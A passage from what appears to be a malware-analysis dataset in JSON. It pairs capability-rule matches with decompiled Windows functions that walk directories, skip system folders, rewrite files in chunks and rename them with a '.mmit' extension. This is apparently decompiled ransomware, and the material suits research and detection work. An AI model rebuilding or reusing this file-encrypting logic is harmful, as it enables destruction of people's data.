!= 0) {\n                        uStack92 = 0x404dde;\n                        fcn.00409a00();\n                        uVar5 = extraout_ECX_00;\n                    }\n                    uStack92 = *(uVar5 - 4);\n                    if (uVar5 <= uStack92) {\n                        uStack92 = 0x404dea;\n                        uStack92 = fcn.00409a00();\n                        uVar5 = extraout_ECX_01;\n                    }\n                    uVar5 = uVar5 - uStack92;\n                    if (uVar5 < 4) {\n                        uStack92 = 0x404df6;\n                        uStack92 = fcn.00409a00();\n                        uVar5 = extraout_ECX_02;\n                    }\n                    if (0x23 < uVar5) {\n                        uStack92 = 0x404e00;\n                        uStack92 = fcn.00409a00();\n                    }\n                }\n                uStack96 = 0x404e08;\n                fcn.0040664d();\n            }\n            uStack92 = 0;\n            uStack96 = 0;\n            uStackY38884 = 0;\n            lpBuffer = 0;\n            iVar3 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n            if (iVar3 == 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n            else {\n                uStackY38884 = 0;\n                uStackY38900 = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)();\n                piVar4 = extraout_ECX;\n                if (iVar3 == 1) {\n                    while ((piVar4 = piStackY38892,  uStackY38888 != 0 &&\n                           (iVar3 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(),  piVar4 = piStackY38892,  iVar3 != 0)))\n                    {\n                        fcn.00405aa0(&stack0xffffde8c, uStackY38888, &stack0xffffbe8c);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                        piVar4 = piStackY38892;\n                        if ((iVar3 == 0) || ((iStackY38872 == 0 || (uStackY38888 < 0x2000)))) break;\n                        if ((uStackY38884._4_4_ == 0) && (uStackY38884 < 0x800)) {\n                            bVar6 = 0xfffffffe < uStackY38884;\n                            uStackY38884._0_4_ = uStackY38884 + 1;\n                            uStackY38884._4_4_ = bVar6;\n                        }\n                        else {\n                            uStackY38900 = CONCAT44((uStackY38900 >> 0x20) + (0xfffffffe < uStackY38900), \n                                                    uStackY38900 + 1);\n                            if (*0x42ef10 != -1) {\n                                uStackY38884 = 0;\n                                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                                (*_sym.imp.KERNEL32.dll_SetEndOfFile)();\n                                piVar4 = piStackY38892;\n                                do {\n                                    iVar1 = *piVar4;\n                                    piVar4 = piVar4 + 1;\n                                } while (iVar1 != 0);\n                                iStack172 = *0x42ef10;\n                                uStack176 = 0x404fad;\n                                (*_sym.imp.KERNEL32.dll_WriteFile)();\n                                uStack176 = 0;\n                                puStack180 = &stack0xffff6828;\n                                uStack184 = 4;\n                                uStack188 = 0x420ef4;\n                                iStack192 = *0x42ef10;\n                                uStack196 = 0x404fc9;\n                                (*_sym.imp.KERNEL32.dll_WriteFile)();\n                                uStack196 = 0;\n                                puStack200 = &stack0xffff6828;\n                                uStack204 = 0x40;\n                                puStack208 = &fcn.00404c60::lpBuffer;\n                                iStack212 = *0x42ef10;\n                                uStack216 = 0x404fe4;\n                                (*_sym.imp.KERNEL32.dll_WriteFile)();\n                                uStack216 = 0;\n                                puStack220 = &stack0xffff6828;\n                                uStack224 = 4;\n                                uStack228 = 0x420ef4;\n                                iStack232 = *0x42ef10;\n                                uStack236 = 0x405000;\n                                (*_sym.imp.KERNEL32.dll_WriteFile)();\n                                uStack236 = 0;\n                                puStack240 = &stack0xffff6828;\n                                uStack244 = 8;\n                                puStack248 = &stack0xffff680c;\n                                iStack252 = *0x42ef10;\n                                uStack256 = 0x40501e;\n                                (*_sym.imp.KERNEL32.dll_WriteFile)();\n                            }\n                            iVar3 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                            piVar4 = piStackY38892;\n                            if (iVar3 == 0) break;\n                        }\n                        iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)();\n                        piVar4 = piStackY38892;\n                        if (iVar3 != 1) break;\n                    }\n                }\n                fcn.00405760(arg_8h);\n                fcn.0040cffe(&stack0xffff706c, 10000, piVar4, 10000);\n                iStack172 = 0x4050a4;\n                fcn.0040a351(&stack0xffff706c, 10000, L\".mmit\", 10000);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                uStackY38884 = 0;\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                (*_sym.imp.KERNEL32.dll_SetEndOfFile)();\n                fcn.0040cef9(piVar4, &stack0xffff706c);\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0040640a(arg_8h_01);\n    return;\n}\n",
        "token_count": 2640
    },
    "00405440": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00405440(void)\n\n{\n    uint16_t uVar1;\n    char16_t cVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint16_t *puVar7;\n    char16_t *pcVar8;\n    uint arg_10h;\n    uint16_t *puVar9;\n    char16_t *pcVar10;\n    bool bVar11;\n    uint32_t uStackY40604;\n    uint32_t uStackY40576;\n    uint32_t uStackY40572;\n    char16_t acStackY40560 [274];\n    uchar auStackY40012 [20000];\n    uchar auStackY20012 [19964];\n    uint uStackY48;\n    uchar *arg_8h;\n    uint var_4h;\n    \n    fcn.00419aa0();\n    fcn.00408980();\n    fcn.00408980();\n    arg_8h = &stack0xffff63b4;\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)();\n    fcn.0040a35c(&stack0xffffb1d4, 10000, arg_10h);\n    fcn.0040a3c0(&stack0xffffb1d4, 10000, 0x420f1c);\n    iVar5 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)();\n    pcVar3 = _sym.imp.KERNEL32.dll_FindNextFileW;\n    if (iVar5 != -1) {\n        do {\n            if ((uStackY40604 & 4) == 0) {\n                if ((uStackY40604 & 0x10) == 0) {\n                    puVar9 = 0x420dc8;\n                    puVar7 = &stack0xffff6190;\n                    do {\n                        uVar1 = *puVar7;\n                        bVar11 = uVar1 < *puVar9;\n                        if (uVar1 != *puVar9) {\ncode_r0x00405656:\n                            uVar6 = -bVar11 | 1;\n                            goto code_r0x0040565b;\n                        }\n                        if (uVar1 == 0) break;\n                        uVar1 = puVar7[1];\n                        bVar11 = uVar1 < puVar9[1];\n                        if (uVar1 != puVar9[1]) goto code_r0x00405656;\n                        puVar7 = puVar7 + 2;\n                        puVar9 = puVar9 + 2;\n                    } while (uVar1 != 0);\n                    uVar6 = 0;\ncode_r0x0040565b:\n                    if (uVar6 != 0) {\n                        pcVar10 = L\"Alad.alad\";\n                        pcVar8 = &stack0xffff6190;\n                        do {\n                            cVar2 = *pcVar8;\n                            bVar11 = cVar2 < *pcVar10;\n                            if (cVar2 != *pcVar10) {\ncode_r0x00405696:\n                                uVar6 = -bVar11 | 1;\n                                goto code_r0x0040569b;\n                            }\n                            if (cVar2 == L'\\0') break;\n                            cVar2 = pcVar8[1];\n                            bVar11 = cVar2 < pcVar10[1];\n                            if (cVar2 != pcVar10[1]) goto code_r0x00405696;\n                            pcVar8 = pcVar8 + 2;\n                            pcVar10 = pcVar10 + 2;\n                        } while (cVar2 != L'\\0');\n                        uVar6 = 0;\ncode_r0x0040569b:\n                        if (uVar6 != 0) {\n                            uStackY48 = 0x4056b5;\n                            fcn.0040a35c(&stack0xffffb1d4, 10000, arg_10h);\n                            uStackY48 = 0x4056d0;\n                            fcn.0040a3c0(&stack0xffffb1d4, 10000, &stack0xffff6190);\n                            if ((uStackY40572 | uStackY40576) != 0) {\n                                cVar4 = fcn.00404c60(uStackY40572, uStackY40576);\n                                if (cVar4 == '\\x01') {\n                                    bVar11 = 0xfffffffe < *0x42ef08;\n                                    *0x42ef08 = *0x42ef08 + 1;\n                                    *0x42ef0c = *0x42ef0c + bVar11;\n                                }\n                                else {\n                                    fcn.00404660(&stack0xffffb1d4);\n                                    bVar11 = 0xfffffffe < *0x42ef18;\n                                    *0x42ef18 = *0x42ef18 + 1;\n                                    *0x42ef1c = *0x42ef1c + bVar11;\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    uStackY48 = 0x405518;\n                    fcn.0040a35c(&stack0xffffb1d4, 10000, arg_10h);\n                    uStackY48 = 0x405533;\n                    fcn.0040a3c0(&stack0xffffb1d4, 10000, &stack0xffff6190);\n                    iVar5 = fcn.0040e2a7(&stack0xffffb1d4, &stack0xffff63b4);\n                    if (((iVar5 != 0) &&\n                        (iVar5 = fcn.0040e2a7(&stack0xffff6190, L\"System Volume Information\"),  iVar5 != 0)) &&\n                       (iVar5 = fcn.0040e2a7(&stack0xffff6190, L\"internet explorer\"),  iVar5 != 0)) {\n                        puVar9 = 0x420f7c;\n                        puVar7 = &stack0xffff6190;\n                        do {\n                            uVar1 = *puVar7;\n                            bVar11 = uVar1 < *puVar9;\n                            if (uVar1 != *puVar9) {\ncode_r0x004055bd:\n                                uVar6 = -bVar11 | 1;\n                                goto code_r0x004055c2;\n                            }\n                            if (uVar1 == 0) break;\n                            uVar1 = puVar7[1];\n                            bVar11 = uVar1 < puVar9[1];\n                            if (uVar1 != puVar9[1]) goto code_r0x004055bd;\n                            puVar7 = puVar7 + 2;\n                            puVar9 = puVar9 + 2;\n                        } while (uVar1 != 0);\n                        uVar6 = 0;\ncode_r0x004055c2:\n                        if (uVar6 != 0) {\n                            puVar9 = 0x420f80;\n                            puVar7 = &stack0xffff6190;\n                            do {\n                                uVar1 = *puVar7;\n                                bVar11 = uVar1 < *puVar9;\n                                if (uVar1 != *puVar9) {\ncode_r0x004055fb:\n                                    uVar6 = -bVar11 | 1;\n                                    goto code_r0x00405600;\n                                }\n                                if (uVar1 == 0) break;\n                                uVar1 = puVar7[1];\n                                bVar11 = uVar1 < puVar9[1];\n                                if (uVar1 != puVar9[1]) goto code_r0x004055fb;\n                                puVar7 = puVar7 + 2;\n                                puVar9 = puVar9 + 2;\n                            } while (uVar1 != 0);\n                            uVar6 = 0;\ncode_r0x00405600:\n                            if (uVar6 != 0) {\n                                fcn.00404660(&stack0xffffb1d4);\n                            }\n                        }\n                    }\n                }\n            }\n            iVar5 = (*pcVar3)();\n        } while (iVar5 != 0);\n    }\n    (*_sym.imp.KERNEL32.dll_FindClose)();\n    fcn.0040640a(arg_8h);\n    return;\n}\n",
        "token_count": 1839
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004059fb)\n// WARNING: Removing unreachable block (ram,0x004059ef)\n\nvoid __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uchar *puStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    int32_t iStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uchar auStack96 [4];\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uchar auStack64 [4];\n    uchar auStack60 [8];\n    ulong uStack52;\n    uint uStack44;\n    char16_t cStack40;\n    ulong uStack36;\n    uint uStack28;\n    char16_t cStack24;\n    uint32_t uStack12;\n    \n    uStack12 = *0x424008 ^ &stack0xffffffa0;\n    puStack108 = &stack0xffffffa4;\n    uStack112 = 0x4058d4;\n    uStack112 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    uStack116 = 0x4058db;\n    (*_sym.imp.SHELL32.dll_CommandLineToArgvW)();\n    if (unaff_ESI < 3) {\n        uStack116 = 0x7f00;\n        uStack120 = 0;\n        uStack52 = str.window._0_8_;\n        uStack44 = str.window._8_4_;\n        cStack40 = str.window[6];\n        uStack36 = str.window._0_8_;\n        uStack28 = str.window._8_4_;\n        cStack24 = str.window[6];\n        uStack92 = 0;\n        uStack88 = 0x405a90;\n        uStack84 = 0;\n        uStack80 = 0;\n        uStack76 = argv;\n        uStack72 = 0;\n        uStack124 = 0x405953;\n        uStack76 = (*_sym.imp.USER32.dll_LoadCursorW)();\n        uStack124 = 0;\n        puStack128 = 0x40595f;\n        uStack76 = (*_sym.imp.GDI32.dll_GetStockObject)();\n        puStack68 = &stack0xffffffc0;\n        puStack128 = &stack0xffffff98;\n        uStack72 = 0;\n        uStack132 = 0x40597e;\n        iVar2 = (*_sym.imp.USER32.dll_RegisterClassW)();\n        pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n        if (iVar2 != 0) {\n            uStack116 = 0;\n            uStack120 = argv;\n            uStack124 = 0;\n            puStack128 = NULL;\n            uStack132 = 0x60;\n            uStack136 = 0x140;\n            uStack140 = 1;\n            iStack144 = 0x40599f;\n            iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)();\n            iStack144 = iVar3 / 2 + -0x30;\n            uStack148 = 0;\n            iStack152 = 0x4059ac;\n            iVar3 = (*pcVar1)();\n            iStack152 = iVar3 / 2 + -0xa0;\n            uStack156 = 0xcf0000;\n            puStack160 = &stack0xffffffd4;\n            puStack164 = &stack0xffffffc4;\n            uStack168 = 0;\n            uStack172 = 0x4059ce;\n            uVar4 = (*_sym.imp.USER32.dll_CreateWindowExW)();\n            uStack172 = 0;\n            (*_sym.imp.USER32.dll_SetWindowLongW)(uVar4);\n            (*_sym.imp.USER32.dll_ShowWindow)(uVar4, 0);\n            fcn.0040a35c(0x4252c0, 10000, 0);\n            fcn.00408980(0x42ef20, 0, 10000);\n            uStack172 = 10000;\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x42ef20, &stack0xffffff54);\n            if (iVar3 == 0) {\n                uVar4 = fcn.00401960(0, 100);\n                fcn.004061e0(0x42ef20, \"COM_%d\", uVar4);\n            }\n            fcn.00405120();\n            (*_sym.imp.KERNEL32.dll_HeapSetInformation)(0, 1, 0, 0);\n        }\n    }\n    puStack108 = 0x405a7e;\n    fcn.0040640a(unaff_EDI);\n    return;\n}\n",
        "token_count": 1158
    },
    "0040e476": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e476(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4252a4, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0040f5be();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0040f545(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "004078bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004078bf(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    \n    *(unaff_EBX + -4) = *(unaff_EBP + -0x2c);\n    fcn.00408f1d(*(unaff_EBP + -0x30));\n    iVar1 = fcn.00408b4e();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x34);\n    iVar1 = fcn.00408b4e();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x38);\n    if (((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) &&\n         ((unaff_EDI[5] == 0x19930520 || ((unaff_EDI[5] == 0x19930521 || (unaff_EDI[5] == 0x19930522)))))) &&\n        (*(unaff_EBP + -0x3c) == 0)) &&\n       ((*(unaff_EBP + -0x1c) != 0 && (iVar1 = fcn.00408f67(unaff_EDI[6]),  iVar1 != 0)))) {\n        fcn.004076bd(unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 373
    },
    "004081cb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004081cb(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406b80(0x422d70, 0x10);\n    if (*(*(unaff_EBP + 0x10) + 4) < 0x81) {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    else {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar4;\n    iVar3 = fcn.00408b4e();\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        if (iVar4 == *(unaff_EBP + 0x14)) goto code_r0x0040825f;\n        if ((iVar4 < 0) || (iVar3 = *(unaff_EBP + 0x10),  *(iVar3 + 4) <= iVar4)) break;\n        iVar1 = *(iVar3 + 8);\n        uVar2 = *(iVar1 + iVar4 * 8);\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + iVar4 * 8) != 0) {\n            iVar1 = *(unaff_EBP + 8);\n            *(iVar1 + 8) = uVar2;\n            fcn.00408c40(*(*(iVar3 + 8) + 4 + iVar4 * 8), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        iVar4 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = iVar4;\n    }\n    do {\n        fcn.0040d100();\ncode_r0x0040825f:\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0040827f();\n    } while (iVar4 != *(unaff_EBP + 0x14));\n    *(*(unaff_EBP + 8) + 8) = iVar4;\n    fcn.00406bc6();\n    return;\n}\n",
        "token_count": 620
    },
    "0040827f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040827f(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408b4e();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.00408b4e();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0040a351": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a351(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack24;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0040a28c:\n            if (arg_ch != 0) {\n                piVar3 = arg_8h;\n                iVar5 = arg_ch;\n                if ((arg_14h == 0) || (arg_10h != NULL)) {\n                    do {\n                        if (*piVar3 == 0) break;\n                        piVar3 = piVar3 + 1;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                    if (iVar5 != 0) {\n                        if (arg_14h == -1) {\n                            iVar4 = arg_10h - piVar3;\n                            do {\n                                iVar1 = *(iVar4 + piVar3);\n                                *piVar3 = iVar1;\n                                piVar3 = piVar3 + 1;\n                                if (iVar1 == 0) break;\n                                iVar5 = iVar5 + -1;\n                            } while (iVar5 != 0);\n                        }\n                        else {\n                            iVar4 = arg_14h;\n                            if (arg_14h != 0) {\n                                do {\n                                    iVar1 = *arg_10h;\n                                    arg_10h = arg_10h + 1;\n                                    *piVar3 = iVar1;\n                                    piVar3 = piVar3 + 1;\n                                    if ((iVar1 == 0) || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                                    iVar4 = iVar4 + -1;\n                                } while (iVar4 != 0);\n                            }\n                            if (iVar4 == 0) {\n                                *piVar3 = 0;\n                            }\n                        }\n                        if (iVar5 != 0) {\n                            return 0;\n                        }\n                        if (arg_14h == -1) {\n                            arg_8h[arg_ch + -1] = 0;\n                            return 0x50;\n                        }\n                        *arg_8h = 0;\n                        puVar2 = fcn.0040f5be();\n                        uStack24 = 0x22;\n                        goto code_r0x0040a2aa;\n                    }\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x0040a28c;\n    puVar2 = fcn.0040f5be();\n    uStack24 = 0x16;\ncode_r0x0040a2aa:\n    *puVar2 = uStack24;\n    fcn.004099f0();\n    return uStack24;\n}\n",
        "token_count": 696
    },
    "0040a4ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040a4ae(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.0040f5be();\n        *puVar1 = 0x16;\n        fcn.004099f0();\n        goto code_r0x0040a5ff;\n    }\n    fcn.00409677(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.0040ac08(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    iVar2 = fcn.0040af43();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x0040a5d7;\ncode_r0x0040a624:\n                    *(puVar1 + arg_14h + -1) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x0040a624;\n                    goto code_r0x0040a5d7;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x0040a5d7:\n            *(puVar1 + var_468h) = 0;\n        }\n    }\n    fcn.0040ac72();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x0040a5ff:\n    fcn.0040640a(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 809
    },
    "0040a62a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040a62a(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.0040f5be();\n        *puVar1 = 0x16;\n        fcn.004099f0();\n        goto code_r0x0040a781;\n    }\n    fcn.00409677(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.0040ac3d(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    iVar2 = fcn.0040b18b();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x0040a756;\ncode_r0x0040a7a6:\n                    *(puVar1 + arg_14h * 2 + -2) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x0040a7a6;\n                    goto code_r0x0040a756;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x0040a756:\n            *(puVar1 + var_468h * 2) = 0;\n        }\n    }\n    fcn.0040ac72();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x0040a781:\n    fcn.0040640a(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 813
    },
    "0040acb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
